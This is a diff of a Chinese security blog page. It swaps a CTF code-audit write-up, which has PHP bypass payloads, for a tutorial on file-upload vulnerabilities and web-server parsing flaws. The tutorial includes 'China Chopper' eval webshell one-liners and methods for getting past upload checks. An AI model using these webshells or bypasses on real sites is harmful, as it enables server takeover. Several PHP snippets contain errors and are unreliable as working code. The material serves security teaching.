@@ -43,7 +43,7 @@
     
     <title>
         
-            0x06 bugku-代码审计 | 
+            0x10 上传漏洞 | 
         
         张Mini
     </title>
@@ -54,7 +54,7 @@
 
     <meta name="format-detection" content="telephone=no"/>
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content="张Mini,ctf">
+    <meta name="keywords" content="张Mini,Web">
     <meta name="theme-color" content="#555555">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -220,7 +220,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="张Mini">
-    <meta name="msapplication-starturl" content="http://alittlexyz.com/2018/05/26/6/">
+    <meta name="msapplication-starturl" content="http://alittlexyz.com/2018/05/29/10/">
     <meta name="msapplication-navbutton-color" content="#555555">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="张Mini">
@@ -235,16 +235,16 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://alittlexyz.com/2018/05/26/6/">
+    <meta property="og:url" content="http://alittlexyz.com/2018/05/29/10/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="0x06 bugku-代码审计 | 张Mini">
+    <meta property="og:title" content="0x10 上传漏洞 | 张Mini">
     <meta property="og:image" content="/img/favicon.png">
     <meta property="og:description" content="">
-    <meta property="og:article:tag" content="ctf"> 
+    <meta property="og:article:tag" content="Web"> 
 
     
-        <meta property="article:published_time" content="Sat May 26 2018 15:58:49 GMT+0800">
-        <meta property="article:modified_time" content="Sat May 26 2018 16:10:24 GMT+0800">
+        <meta property="article:published_time" content="Tue May 29 2018 21:59:29 GMT+0800">
+        <meta property="article:modified_time" content="Tue May 29 2018 22:47:21 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -252,7 +252,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://alittlexyz.com/2018/05/26/6/index.html" />
+        <link rel="canonical" href="http://alittlexyz.com/2018/05/29/10/index.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -264,10 +264,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "http://alittlexyz.com/2018/05/26/6/index.html",
-    "headline": "0x06 bugku-代码审计",
-    "datePublished": "Sat May 26 2018 15:58:49 GMT+0800",
-    "dateModified": "Sat May 26 2018 16:10:24 GMT+0800",
+    "mainEntityOfPage": "http://alittlexyz.com/2018/05/29/10/index.html",
+    "headline": "0x10 上传漏洞",
+    "datePublished": "Tue May 29 2018 21:59:29 GMT+0800",
+    "dateModified": "Tue May 29 2018 22:47:21 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "张Mini",
@@ -285,7 +285,7 @@
             "url": "/img/favicon.png"
         }
     },
-    "keywords": ",ctf张Mini",
+    "keywords": ",Web张Mini",
     "description": "",
 }
 </script>
@@ -351,7 +351,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#BUGKU代码审计"><span class="post-toc-number">1.</span> <span class="post-toc-text">BUGKU代码审计</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#extract变量覆盖"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">extract变量覆盖</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#strcmp-比较字符串"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">strcmp()比较字符串</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#urldecode二次编码绕过"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">urldecode二次编码绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#md5-函数"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">md5()函数</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#数组返回NULL绕过"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">数组返回NULL绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sha-函数比较绕过"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">sha()函数比较绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#md5-加密相等绕过"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">md5()加密相等绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#十六进制与数字比较"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">十六进制与数字比较</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ereg正则-00截断"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">ereg正则%00截断</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#strpos数组绕过"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">strpos数组绕过</span></a></li></ol></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#上传漏洞"><span class="post-toc-number">1.</span> <span class="post-toc-text">上传漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#IIS解析漏洞"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">IIS解析漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Apache解析漏洞"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">Apache解析漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PHP-CGI解析漏洞"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">PHP CGI解析漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#绕过上传漏洞"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">绕过上传漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#客户端检测"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">客户端检测</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#使用Firebug"><span class="post-toc-number">1.4.1.0.1.</span> <span class="post-toc-text">使用Firebug</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#中间人攻击"><span class="post-toc-number">1.4.1.1.</span> <span class="post-toc-text">中间人攻击</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#服务器端检测"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">服务器端检测</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#白名单与黑名单验证"><span class="post-toc-number">1.4.2.1.</span> <span class="post-toc-text">白名单与黑名单验证</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#黑名单过滤方式"><span class="post-toc-number">1.4.2.1.1.</span> <span class="post-toc-text">黑名单过滤方式</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#白名单过滤方式"><span class="post-toc-number">1.4.2.1.2.</span> <span class="post-toc-text">白名单过滤方式</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#MIME验证"><span class="post-toc-number">1.4.2.2.</span> <span class="post-toc-text">MIME验证</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#目录验证"><span class="post-toc-number">1.4.2.3.</span> <span class="post-toc-text">目录验证</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#截断上传攻击"><span class="post-toc-number">1.4.2.4.</span> <span class="post-toc-text">截断上传攻击</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#修复上传漏洞"><span class="post-toc-number">1.4.3.</span> <span class="post-toc-text">修复上传漏洞</span></a></li></ol></li></ol></li></ol>
     </ul>
     
 
@@ -383,7 +383,7 @@
         
     
             <p class="article-headline-p">
-                0x06 bugku-代码审计
+                0x10 上传漏洞
             </p>
         </div>
 
@@ -402,7 +402,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>张Mini</strong>
-        <span>May 26, 2018</span>
+        <span>May 29, 2018</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -424,7 +424,7 @@
 <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
     <li class="mdl-menu__item">Read this article on other devices</li>
     
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACYUlEQVR42u3aMXLDMAwEQP//00mbImbuCIuWM6vK43EkrgoSOeDx9a+vBx4eHh4eHh4e3s14j/j6+ftfbvrk+2fPSu7Qrg0PDw/vJC9Z1rNH5r9v2e3a8PDw8M7z8sNgvaA1e33/9edobXh4eHg3402K7Mmd8fDw8D6Xl2/3640+L9/x8PDw7swr/uEvwUkkMX8deHh4eCd5ew2wM5/f1t/Dw8PDe8Jrr3y7LxZUHh5/rBAPDw/vYl4SpLbDUnlxnLTZ2qEEPDw8vPO8PCZot/7kJeYtNDw8PLz78PKW/168mxTTey8ODw8P7128NaltibUBRDt8gIeHh3ee1xbQOT6H7QUiowYYHh4e3ot4eUPrtbFC8pQiPsbDw8O7mNe29ifDATmgLazx8PDwzvP2YoJJrLC36ePh4eHdjdeGDpOlPOIrCTjw8PDwzvOSsriNMPZaaHvxLh4eHt4dePl2PBk+yEOHS7IWPDw8vHHOeXXLv32JmwcVHh4e3sW8vFzOG2N7YwSTe+Lh4eGd5LUl75y3V14X3+Dh4eFdzMuHACatskkMUZf+eHh4eEd4bbsrHwtoRwomAS4eHh7eGV6yfeelcx4B5+MLbRSCh4eHdzWvvdrFrRe0LsSTvx2l1Hh4eHhbvHZTnmzf7RhWHk/g4eHhneftBRB7B8BkECFi4+Hh4R3kJdt3+83k8MiPEzw8PLw78/LgYD4E0I444OHh4X0Kry2s21I+KeLx8PDw3sXbG5CK2vlxmb6+Q9SQw8PDwzvCe1kQECwuP4pyEh4eHt5J3v+78PDw8PDw8PDwbnB9AwxtxHDFh46aAAAAAElFTkSuQmCC">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACXklEQVR42u3aUXLCMAwE0Nz/0u0BWtKVZJuUef5iIAQ/f8Ri5evro8eFh4eHh4eHh4f3MN4Vj19u9OP9+yt7d6vODQ8PD+8M749H7e01zUm8+PTV63xueHh4eCd5+U/eT/ee3dsqkrnh4eHhPZlXLYWrC4GHh4f3ebx80sm3koXDw8PDeyYv+cN/DcY/yFrw8PDwYl4+ufOvj/b38PDw8AJe+UhTMVxI7pZceehMGR4eHl7Ayx/E+dGBpAGWRBLN+eDh4eEd5OURwKpDWnnImy8ZHh4e3m5e/re/WgpPGlrVVhkeHh7ee3nV0jk/KJDcJ//15saAh4eHt4GXt8Fy8H0xncQThS0EDw8PbzMveXxPliMBVGORUdaCh4eHN+ZV2075hpE3yXrR7Us8Hh4e3mbeJETIC99qIb4sxsXDw8M7wqtGrqtii3xR/thI8PDw8A7yJiFFHj30CvE8CMbDw8PbzYuK1MESVEvkxSU1Hh4e3pt4vag3p+btsQUpNR4eHt6Y1zv2NAkLktj3aBiBh4eHt5TXCxeqh6h6rTg8PDy8Z/Im08rbWpOW27KSGg8PD298nrMapE7eqWKaGwMeHh7eNt6OJlbv2FbzYCseHh7eZl515JFu9Q69+AMPDw/vPG/yUF4b7Oalc+HQFR4eHt42XrIZ9B79+zaGUQMMDw8PbxEvb1zly5EHshM8Hh4e3vN5eeF7/jgsHh4e3jN5yUO8Wmr3NpKN+x4eHh7eojAiX4jqd6uxBR4eHt57eXkEkJfXSblcXcoo8sDDw8PbzPu8gYeHh4eHh4eH94DxDSdYhpKkfkfsAAAAAElFTkSuQmCC">
     
 </ul>
 
@@ -438,7 +438,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/ctf/">ctf</a>
+        <a class="post_tag-link" href="/tags/Web/">Web</a>
     </ul>
     
 
@@ -455,7 +455,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=0x06 bugku-代码审计&url=http://alittlexyz.com/2018/05/26/6/index.html&pic=http://alittlexyz.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=0x10 上传漏洞&url=http://alittlexyz.com/2018/05/29/10/index.html&pic=http://alittlexyz.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 Share to Weibo
             </li>
@@ -476,7 +476,7 @@
 
     <!-- Share QQ -->
     
-        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=张Mini&title=0x06 bugku-代码审计&summary=&pics=http://alittlexyz.com/img/favicon.png&url=http://alittlexyz.com/2018/05/26/6/index.html" target="_blank">
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=张Mini&title=0x10 上传漏洞&summary=&pics=http://alittlexyz.com/img/favicon.png&url=http://alittlexyz.com/2018/05/29/10/index.html" target="_blank">
             <li class="mdl-menu__item">
                 Share to QQ
             </li>
@@ -495,225 +495,241 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h1 id="BUGKU代码审计"><a href="#BUGKU代码审计" class="headerlink" title="BUGKU代码审计"></a>BUGKU代码审计</h1><hr>
-<h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><pre><code class="php">&lt;?php
-$flag=&#39;xxx&#39;;
-extract($_GET);
-if(isset($shiyan))
-{
-$content=trim(file_get_contents($flag));
-if($shiyan==$content)
-{
-echo&#39;flag{xxx}&#39;;
-}
-else
-{
-echo&#39;Oh.no&#39;;
-}
-}
+        <h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><hr>
+<p>解析漏洞: 攻击者利用上传漏洞时，通常与web容器的解析漏洞配合在一起。常见的web容器有IIS、Nginx、Apache、Tomcat等</p>
+<h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><p>IIS6.0在解析文件时存在以下两个解析漏洞</p>
+<ol>
+<li>当建立<em>.asa,</em>.asp格式的文件夹，其目录下的任意文件都将被IIS当作asp文件解析</li>
+</ol>
+<p>例如，建立文件夹parsing.asp，在里面新建一个test.txt。其内容为 &lt;%=NOW()%&gt;。其内容被IIS当作asp脚本来解析。</p>
+<ol start="2">
+<li>当文件为*.asp;1.jpg时。同样会以asp脚本执行</li>
+</ol>
+<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>在Apache1.x和2.x中存在漏洞</p>
+<p><a href="http://www.xxser.com/1.php.rar" target="_blank" rel="noopener">www.xxser.com/1.php.rar</a></p>
+<p>上述的文件名为1.php.rar，本应弹出下载文件的提示，但却显示了phpinfo()的内容。这就是apache的解析漏洞</p>
+<p>1.php.rar内容如下</p>
+<pre><code class="php">&lt;?php
+    phpinfo();
 ?&gt;
 </code></pre>
-<p>extract()函数，从数组中将变量导入到当前的符号表，使用数组键名作为变量名，使用数组键值作为变量值。</p>
-<p>构造payload：?shiyan=&amp;flag=</p>
-<p>由于不知道flag里的内容，设置为空，再把$shiyan设置为空</p>
-<h2 id="strcmp-比较字符串"><a href="#strcmp-比较字符串" class="headerlink" title="strcmp()比较字符串"></a>strcmp()比较字符串</h2><pre><code class="php">&lt;?php
-$flag = &quot;flag{xxxxx}&quot;;
-if (isset($_GET[&#39;a&#39;])) {
-if (strcmp($_GET[&#39;a&#39;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。
-//比较两个字符串（区分大小写）
-die(&#39;Flag: &#39;.$flag);
-else
-print &#39;No&#39;;
-}
+<p>apache在解析文件有一个原则:当碰到不认识的扩展名时，从后向前解析，知道碰到认识的扩展名为止。如果都不认识，会暴漏源码</p>
+<p>在apache安装目录下”/conf/mime.types”中有详细的扩展名列表</p>
+<h2 id="PHP-CGI解析漏洞"><a href="#PHP-CGI解析漏洞" class="headerlink" title="PHP CGI解析漏洞"></a>PHP CGI解析漏洞</h2><p>Nginx是一款高性能的Web服务器，通常作为PHP的解析容器。它曾被爆出两个解析漏洞</p>
+<p><a href="http://www.xxser.com/1.jpg/1.php" target="_blank" rel="noopener">http://www.xxser.com/1.jpg/1.php</a></p>
+<p>此时的1.jpg会被当作PHP脚本来解析</p>
+<p>此时的1.php是不存在的，但1.jpg却按照php脚本解析了。问题就在这个”1.php”中(1.php不是特定的，可以随意命名)，这就意味着攻击者可以上传图片木马，然后在url加上/xxx.php就可以获得网站的Webshell</p>
+<h2 id="绕过上传漏洞"><a href="#绕过上传漏洞" class="headerlink" title="绕过上传漏洞"></a>绕过上传漏洞</h2><p>程序员在防止上传漏洞时可以分为两种</p>
+<ol>
+<li><p>客户端检测: 客户端使用JavaScript检测，在文件未上传时，就对文件进行验证</p>
+</li>
+<li><p>服务器端检测: 服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法，甚至是否嵌入恶意代码等</p>
+</li>
+</ol>
+<p>“中国菜刀”：仅需要一段简短的代码便可以管理网站。目前支持的服务器端脚本包括: php、ASP、ASP.NET、JSP等，并且支持HTPTPS安全连接的网站</p>
+<pre><code class="php">PHP: &lt;?php @eval($_POST[&#39;mima&#39;]);?&gt;
+ASP: &lt;%eval request(&quot;mima&quot;)%&gt;
+ASP.NET &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;mima&quot;],&quot;unsafe&quot;);%&gt;
+</code></pre>
+<p>“图片一句话”是将一句话插入在图片里面。例如: Edjpgcom这个软件只需要将图片拖入程序中，在填写一句话，就可以制作图片一句话木马</p>
+<h3 id="客户端检测"><a href="#客户端检测" class="headerlink" title="客户端检测"></a>客户端检测</h3><p>很多程序员仅通过JavaScript拒绝非法上传，是十分低级的验证</p>
+<p>例入下列代码对文件扩展名进行验证，如果不是白名单中的扩展名将不会提交到服务器</p>
+<pre><code class="html">&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;图片上传&lt;/title&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    function checkFile() {
+        var flag=false;                                  //是否可以上传的标志位
+        var str=document.getElementById(&quot;file&quot;).value;   //获取文件名
+        str=str.substring(str.lastIndexOf(&#39;.&#39;)+1);         //得到扩展名
+        var arr=new Array(&#39;png&#39;,&#39;bmp&#39;,&#39;gif&#39;,&#39;jpg&#39;);         //允许上传的扩展名
+        for(var i=0;i&lt;arr.length;i++) {
+            if(str==arr[i]) {
+                flag=true;                                  //判断文件名是否合法
+            }
+        }
+        if(!flag) {
+            alert(&#39;文件不合法&#39;);
+        }
+        return flag;
+    }
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+        &lt;from action=&quot;upload.php&quot; method=&quot;post&quot; onsubmit=&quot;checkFile&quot; enctype=&quot;multipart/form-data&quot;&gt;
+            &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;&lt;br/&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;submit&quot; /&gt;
+        &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;        
+upload.php用来接收文件，在接受文件后，将文件重命名放到本目录下。
+&lt;?php
+    if(isset($_POST[&quot;submit&quot;])) {
+        $name= $_FILES[&#39;file&#39;][&#39;name&#39;];                       //接收文件名
+        $name=md5(data(&#39;Y-m-d h:m:s&#39;)).strrchr($name,&quot;.&quot;);    //文件名重命名操作，保留原有扩展名
+        $size=$_FILES[&#39;files&#39;][&#39;size&#39;];                       //接收文件大小
+        $tmp=$_FILES[&#39;file&#39;][&#39;tmp_name&#39;];                     //临时路径
+        move_upload_file($tmp,$name);                         //移动临时文件到当前文件目录
+        echo &quot;文件上传成功 path:&quot;.$name;
+    }    
 ?&gt;
 </code></pre>
-<p>strcmp()函数有一个漏洞，只要提交一个数组a[]进去，就可以绕过</p>
-<p>payload：?a[]=</p>
-<h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><pre><code class="php">&lt;?php
-if(eregi(&quot;hackerDJ&quot;,$_GET[id])) {
-echo(&quot;
-
-not allowed!
-
-&quot;);
-exit();
-}
-$_GET[id] = urldecode($_GET[id]);
-if($_GET[id] == &quot;hackerDJ&quot;)
-{
-echo &quot;
-Access granted!
-
-&quot;;
-echo &quot;
-flag
-
-&quot;;
-}
+<p>针对客户端验证有非常多的绕过方式</p>
+<h5 id="使用Firebug"><a href="#使用Firebug" class="headerlink" title="使用Firebug"></a>使用Firebug</h5><p>当单机”提交”按钮后，Form将出发onsubmit事件，它将会调用checkFile函数。这个函数将会检测文件扩展名是否合法，并返回一个布尔值</p>
+<p>我们可以使用FireBug直接将onsubmint事件删除，就可以绕过</p>
+<p>在没有FireBug前，攻击者通常会在本地构造一个表单</p>
+<pre><code class="html">&lt;form action=&quot;http://www.xxser.com/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;&lt;br/&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre>
+<h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><p>这种方式与FireBug完全不同，它是使用Burp按照正常的流程通过JavaScript验证，然后在传输中的HTTP层做手脚。</p>
+<p>首先把木马文件扩展名改为一张正常的图片的扩展名。在上传时使用Burp拦截数据，将其中的扩展名改为php。就可以绕过客户端验证</p>
+<p>这里需要注意: 在HTTP协议中有请求头Content-Length，代表实体正文长度，而修改filename意为着实体长度的改变</p>
+<p>如: Content-Length长度为200.把文件中的filename=”xxser.jpg”修改为”1.php”，实体正文少了4个字符。所以需要把Content-Length改为196</p>
+<h3 id="服务器端检测"><a href="#服务器端检测" class="headerlink" title="服务器端检测"></a>服务器端检测</h3><p>主要包含一下几点: 白名单、黑名单扩展名过滤，文件类型检测，文件重命名等操作</p>
+<h4 id="白名单与黑名单验证"><a href="#白名单与黑名单验证" class="headerlink" title="白名单与黑名单验证"></a>白名单与黑名单验证</h4><h5 id="黑名单过滤方式"><a href="#黑名单过滤方式" class="headerlink" title="黑名单过滤方式"></a>黑名单过滤方式</h5><p>它是一种不安全的方式，黑名单定义了一系列不安全的扩展名</p>
+<pre><code class="php">&lt;?php
+    $Blacklist=array(&#39;asp&#39;,&#39;php&#39;,&#39;jsp&#39;,&#39;php5&#39;,&#39;asa&#39;,&#39;aspx&#39;);   //黑名单
+    if(isset($_POST[&quot;submit&quot;])) {
+    $name= $_FILES[&#39;file&#39;][&#39;name&#39;];                            //接收文件名
+    $extension=substr(strrchr($name,&quot;.&quot;),1);                   //得到扩展名
+    $boo=false;
+    foreach($Blacklist as $key =&gt; $values) {
+        if($value==$extension) {
+            $boo=true;
+            break;
+        }
+    }
+    if(!boo) {                                                 //如果没有命中，则开始上传
+        $size=$_FILES[&#39;file&#39;][&#39;size&#39;];                         //接收文件大小
+        $tmp=$_FILES[&#39;file&#39;][&#39;tmp_name&#39;];                      //临时路径
+        move_upload_file($tmp,$name);                          //移动临时文件到当前文件目录
+        echo &quot;文件上传成功&lt;br/&gt; path:&quot; .$name;
+    } else {
+        echo &quot;文件不合法&quot;;
+        }
+    }    
 ?&gt;
 </code></pre>
-<p>这题只要将hackerDJ进行二次URL加密即可</p>
-<p>payload：?id=hacker%2544J</p>
-<h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><pre><code class="php">&lt;?php
-error_reporting(0);
-$flag = &#39;flag{test}&#39;;
-if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) {
-if ($_GET[&#39;username&#39;] == $_GET[&#39;password&#39;])
-print &#39;Your password can not be your username.&#39;;
-else if (md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]))
-die(&#39;Flag: &#39;.$flag);
-else
-print &#39;Invalid password&#39;;
+<p>通过上述代码可以看到，如果上传文件为asp,php,jsp.php5,asa,aspx，将不再保存文件。但实际效果没有那么好，攻击者可以使用很多方法绕过黑名单检测</p>
+<ol>
+<li>可以从黑名单中找到Web开发人员忽略的扩展名，如: cer</li>
+<li>在Upload.php中并没有对接受的文件扩展名进行大小写转换操作，那就意为着可以上传Php、Asp这样的扩展名，而此类扩展名在Windows平台依然会被Web容器解析</li>
+<li>在win系统下，如果文件名是以”.”或者空格结尾，系统会自动去除”.”与空格，利用这个可以绕过黑名单验证,如: 上传”asp.” or “asp “的扩展名程序。</li>
+</ol>
+<h5 id="白名单过滤方式"><a href="#白名单过滤方式" class="headerlink" title="白名单过滤方式"></a>白名单过滤方式</h5><p>白名单的过滤方式与黑名单相反，比黑名单拥有更好的防御机制</p>
+<pre><code class="php">&lt;?php
+    $WhiteList=array(&#39;rar&#39;,&#39;jpg&#39;,&#39;png&#39;,&#39;bmp&#39;,&#39;gif&#39;,&#39;jpg&#39;,&#39;doc&#39;);   //白名单
+    if(isset($_POST[&quot;submit&quot;])) {
+        $name= $_FILES[&#39;file&#39;][&#39;name&#39;];                            //接收文件名
+        $extension=substr(strrchr($name,&quot;.&quot;),1);                   //得到扩展名
+        $boo=false;
+        foreach($$WhiteList as $key =&gt; $value) {
+            if($value==$extension) {
+                $boo=true;
+            }
+        }
+    if($boo) {
+        $size=$_FILES[&#39;file&#39;][&#39;size&#39;];                            //接收文件大小
+        $tmp=$_FILES[&#39;file&#39;][&#39;tmp_name&#39;];                         //临时文件大小
+        move_upload_file($tmp,$name);                             //移动临时文件到当前文件目录
+        echo &quot;文件上传成功&lt;br/&gt; path:&quot;.$name;
+    } else {
+        echo &quot;文件不合法&quot;;
+        }
+    }    
+?&gt;    
+</code></pre>
+<p>白名单仅仅是防御上传漏洞的第一步。白名单并不能完全防御上传漏洞，就像前面说的IIS解析漏洞一样，可以顺利通过验证</p>
+<h4 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h4><p>MIME类型用来设定某种扩展名文件的打开方式，当具有该扩展名的文件被访问时，浏览器会自动使用指定的应用程序打开。如:gif图片MIME为 image/gif,CSS文件MIME类型为text/css</p>
+<p>上传时，开发人员会对文件MIME类型做验证</p>
+<pre><code class="php">if($_FILES[&#39;file&#39;][&#39;type&#39;]==&quot;img/jpeg&quot;) {  //判断是否时JPG格式
+    $imageTempName=$_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
+    $imageName=$_FILES[&#39;file&#39;][&#39;name&#39;];
+    $last=substr($imageName,strrpos($imageName,&quot;.&quot;));
+    if(!is_dir(&quot;uploadFile&quot;)) {
+        mkdir(&quot;uploadFile&quot;);
+    }
+    $imageName=md5($imageName).$last;
+    move_upload_file($imageTempName,&quot;./uploadFile/&quot;.$imageName); //指定上传文件到uploadFile目录
+    echo(&quot;文件上传成功 path=/upload/$imageName&quot;);
+    } else {
+        echo(&quot;文件类型错误，请重新上传&quot;);
+        exit();
+    }
+</code></pre>
+<p>上传php文件时，并使用Burp拦截查看MIME类型，更改Content-Type即可通过验证</p>
+<h4 id="目录验证"><a href="#目录验证" class="headerlink" title="目录验证"></a>目录验证</h4><p>在文件上传时，程序允许用户将文件放到指定的目录中，而有些开发人员通常会做一个操作，如果目录存在，就将目录写入，不存在则先建立目录，再写入</p>
+<pre><code class="html">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;br/&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;Extension&quot; value=&quot;up&quot; /&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre>
+<p>PHP Code:</p>
+<pre><code class="php">if($_FILES[&#39;file&#39;][&#39;type&#39;]==&quot;image/jpeg&quot;) {
+    $imageTempName=$_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
+    $imageName=$_FILES[&#39;file&#39;][&#39;name&#39;];
+    $last=substr($imageName,strrpos($imageName,&quot;.&quot;)); //获取扩展名
+    if($last!=&quot;.jpg&quot;) {
+    exit(&quot;图片类型错误&quot;);
+    }
+    $Extension=$_POST[&#39;Extension&#39;];                  //获取文件上传目录
+    if(!is_dir($Extension)) {                        //如果文件不存在，就建立
+        mkdir($Extension)
+    }
+    $imageName=md5($imageName).$last;
+    move_upload_file($imageTempName,&quot;./$Extension/&quot;.$imageName);
+    echo(&quot;文件上传成功 path=/$Extension/$imageName&quot;);
+    } else(&quot;文件类型错误，请重新上传&quot;);
+    exit();
 }
+在Upload.php中有一下代码
+if(!is_dir($Extension)) {
+        mkdir($Extension);
+}
+</code></pre>
+<p>这段代码是引发漏洞的关键点，因为HTML中有一个隐藏标签</p>
